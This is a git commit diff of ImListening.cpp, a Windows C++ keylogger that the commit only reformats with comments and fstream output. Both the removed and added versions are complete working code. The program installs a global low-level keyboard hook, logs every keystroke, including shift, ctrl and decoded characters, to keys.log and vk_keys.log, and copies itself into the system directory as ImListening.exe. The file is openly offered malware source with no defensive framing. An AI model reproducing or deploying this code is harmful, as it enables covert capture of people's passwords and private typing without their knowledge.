53921414ade195335439df08b7734f0ee3c32734
CybeRazor <35109470+cyberazor0@users.noreply.github.com>
2019-10-30 05:09:28 +0100

    Added comments, tabulations and fstream library
    Added fstream library for handling files, comments and tabulation to make code more readable

--- ImListening.cpp
+++ ImListening.cpp
@@ -1,11 +1,9 @@
-#include <stdio.h>
+#include <fstream>
 #include <iostream>
 #include <windows.h>
 #include <string>
 
 using namespace std;
-
-string getExePath(void);
 
 HHOOK hKeyHook;
 KBDLLHOOKSTRUCT kbdStruct;
@@ -15,147 +13,150 @@ WCHAR buffer[16];
 
 char systemPath[MAX_PATH];
 char pathtofile[MAX_PATH];
+
 HMODULE GetModH = GetModuleHandle(NULL);
- 
-LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
-{
 
-    if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
-    {
-        FILE *LOG;
-        FILE *VKLOG;
-              
-        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-        
-        LOG = fopen("keys.log", "a");
-        VKLOG = fopen("vk_keys.log", "a");
-        
-        switch((unsigned int)kbdStruct.vkCode){
-              case 0xA1:
-                   fprintf(LOG,"[right shift down]");
-              break;
-              
-              case 0xA0:
-                    fprintf(LOG,"[shift down]");
-              break;   
-              
-              case 0x8:
-                    fprintf(LOG, "[backspace]");
-              break;  
-              
-              case 0xD:
-                    fprintf(LOG, "\n");
-              break;
-              
-              case 0x1B:
-                    fprintf(LOG,"[esc]");
-              break;            
-              
-              case 0x9:
-                    fprintf(LOG,"[tab]");
-              break;
-              
-              case 0x2E:
-                    fprintf(LOG,"[delete]");
-              break;
-              
-              case 0xA4:
-                    fprintf(LOG,"[alt]");
-              break;
-              
-              case 0x25:
-                   fprintf(LOG,"[left]");
-              break;
-              
-              case 0x26:
-                   fprintf(LOG,"[up]");
-              break;
-              
-              case 0x27:
-                   fprintf(LOG,"[right]");
-              break;
-              
-              case 0x28:
-                   fprintf(LOG,"[down]");
-              break;
-              
-              case 0xA2:
-              case 0xA3:
-                    fprintf(LOG,"[ctrl]");
-              break;
-              
-              default:
-                      GetKeyboardState((PBYTE)&keyState);
-                      ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE)&keyState, (LPWSTR)&buffer, sizeof(buffer) / 2, 0);
-                      fprintf(LOG, "%c",buffer[0]);
-              break;
-        }
-        
-        fprintf(VKLOG, "%X\n", kbdStruct.vkCode);
-        
-        fclose(VKLOG);
-        fclose(LOG);
-        
-    }
-    
-    if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)))
-    {
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam); 
-             
-            FILE *LOG;
-            LOG = fopen("keys.log", "a");
-            
-            switch((unsigned int)kbdStruct.vkCode){
-                             
-              case 0xA1:
-                   fprintf(LOG,"[right shift up]");
-              break;
-              
-              case 0xA0:
-                    fprintf(LOG,"[left shift up]");
-              break;
-            }
-            fclose(LOG);  
-    }
-    
-    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
-}
- 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow)
-{
-    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
-     
-    MSG message;
-    
-    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
-    GetSystemDirectory(systemPath,sizeof(systemPath));
-    
-    const char *exePath = getExePath().c_str();
-    
-    cout << "checking" << endl;
-    
-    cout << systemPath << " ---- " << exePath << endl;
-    
-    if (strcmp(systemPath, exePath)!= 0){
-          strcat(systemPath,"\\ImListening.exe");
-          CopyFile(pathtofile,systemPath,false);  
-          cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
-    }
-    
-    while(GetMessage(&message, NULL, 0, 0))
-    {
-        TranslateMessage(&message);
-        DispatchMessage(&message);
-    }
-     
-    UnhookWindowsHookEx(hKeyHook);
-    return 0;
+
+//function that returns executable path
+string getExePath(){
+	char buffer[MAX_PATH];
+	GetModuleFileName(NULL, buffer, MAX_PATH);
+	string::size_type pos = string(buffer).find_last_of( "\\/" );
+	return string(buffer).substr(0, pos);
 }
 
-string getExePath() {
-    char buffer[MAX_PATH];
-    GetModuleFileName( NULL, buffer, MAX_PATH );
-    string::size_type pos = string( buffer ).find_last_of( "\\/" );
-    return string( buffer ).substr( 0, pos);
+
+//function that triggers on keypress
+LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam){
+	
+	//on key pressed
+	if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))){
+		
+		//output files
+		ofstream LOG("keys.log",  ios_base :: app | ios_base :: out);
+		ofstream VKLOG("vk_keys.log",  ios_base :: app | ios_base :: out);
+		
+		//captured key
+		kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);
+		
+		//decode vkey and write it to logfile
+		switch((unsigned int) kbdStruct.vkCode){
+			case 0xA1:
+				LOG << "[right shift down]";
+			break;
+			
+			case 0xA0:
+				LOG << "[shift down]";
+			break;
+			
+			case 0x8:
+				LOG << "[backspace]";
+			break;
+			
+			case 0xD:
+				LOG << "\n";
+			break;
+			
+			case 0x1B:
+				LOG << "[esc]";
+			break;
+			
+			case 0x9:
+				LOG << "[tab]";
+			break;
+			
+			case 0x2E:
+				LOG << "[delete]";
+			break;
+			
+			case 0xA4:
+				LOG << "[alt]";
+			break;
+			
+			case 0x25:
+				LOG << "[left]";
+			break;
+			
+			case 0x26:
+				LOG << "[up]";
+			break;
+			
+			case 0x27:
+				LOG << "[right]";
+			break;
+			
+			case 0x28:
+				LOG << "[down]";
+			break;
+			
+			case 0xA2:
+			case 0xA3:
+				LOG << "[ctrl]";
+			break;
+			
+			default:
+				GetKeyboardState((PBYTE) &keyState);
+				ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE) &keyState, (LPWSTR) &buffer, sizeof(buffer) / 2, 0);
+				LOG << buffer[0];
+			break;
+		}
+		
+		//log hex vkey
+		VKLOG << hex << uppercase << kbdStruct.vkCode << endl;
+		
+		//close output files
+		VKLOG.close();
+		LOG.close();
+	}
+	
+	//on key released
+	if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))){
+		kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);
+		ofstream LOG("keys.log", ios_base :: app | ios_base :: out);
+		
+		switch((unsigned int) kbdStruct.vkCode){
+			case 0xA1:
+				LOG << "[right shift up]";
+				break;
+			case 0xA0:
+				LOG << "[left shift up]";
+				break;
+		}
+		
+		LOG.close();
+	}
+	
+	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
 
+//main function
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow){
+	
+	//start capturing keys
+	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
+	
+	MSG message;
+	
+	//get file name, file path and system path
+	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
+	GetSystemDirectory(systemPath, sizeof(systemPath));
+	const char *exePath = getExePath().c_str();
+	
+	cout << "checking...\nexePath: " << exePath <<"\nsystemPath: " << systemPath << endl;
+	
+	//if file not in system path, copy itself into it
+	if(strcmp(systemPath, exePath) != 0){
+		strcat(systemPath, "\\ImListening.exe");
+		CopyFile(pathtofile, systemPath, false);
+		cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
+	}
+	
+	while(GetMessage(&message, NULL, 0, 0)){
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+	
+	//unhook before closing
+	UnhookWindowsHookEx(hKeyHook);
+	return 0;
+}
